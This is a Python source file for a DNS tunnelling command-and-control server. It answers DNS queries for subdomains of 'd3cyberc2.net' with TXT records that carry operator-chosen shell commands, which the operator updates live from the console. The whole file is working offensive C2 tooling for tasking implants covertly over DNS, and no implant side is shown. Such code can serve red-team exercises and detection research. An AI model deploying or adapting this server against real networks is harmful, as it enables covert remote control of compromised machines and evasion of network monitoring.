#!/usr/bin/env python3
import socketserver
import threading
from dnslib import DNSRecord, RR, QTYPE, TXT

# Global variable to hold the current command.
# This is the base command you want to send.
command_response = "ls"

def update_command():
    """
    Background thread function that continuously reads operator input
    to update the command response.
    """
    global command_response
    while True:
        try:
            new_cmd = input("Enter new command (or press Enter to keep current): ").strip()
            if new_cmd:
                command_response = new_cmd
                print("Updated command to:", command_response)
        except Exception as e:
            print("Error updating command:", e)
            break

class DNSTunnelHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data, sock = self.request
        try:
            request = DNSRecord.parse(data)
        except Exception as e:
            print("Failed to parse DNS query:", e)
            return

        client_ip = self.client_address[0]
        print(f"\nReceived DNS query from {client_ip}:")
        print(request)

        # Extract the queried domain name.
        qname = request.q.qname
        qname_str = str(qname)
        print("Query name:", qname_str)

        # Check if the query is for our controlled domain.
        # In this example, we're using "d3cyberc2.net." as our domain.
        if qname_str.endswith("d3cyberc2.net."):
            # Extract the subdomain part.
            subdomain = qname_str[:-len("d3cyberc2.net.")].rstrip(".")
            print("Extracted subdomain:", subdomain)
            
            # Build a response that incorporates the subdomain.
            # For example, return a TXT record that includes the subdomain and command.
            txt_response = f"{subdomain}: {command_response}"
            
            reply = request.reply()
            reply.add_answer(RR(
                rname=qname,
                rtype=QTYPE.TXT,
                rclass=1,
                ttl=300,
                rdata=TXT(txt_response)
            ))
            print("Sending response:", txt_response)
        else:
            # For queries outside our controlled domain, return an empty reply.
            reply = request.reply()

        sock.sendto(reply.pack(), self.client_address)

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Simple DNS Tunnel Server with Subdomain-Aware Responses")
    parser.add_argument("--port", type=int, default=53, help="UDP port to listen on (default: 53)")
    args = parser.parse_args()

    # Start a background thread to allow operator to update the command.
    threading.Thread(target=update_command, daemon=True).start()

    print(f"Starting DNS Tunnel Server on UDP port {args.port}...")
    server = socketserver.UDPServer(("", args.port), DNSTunnelHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("Server stopped.")
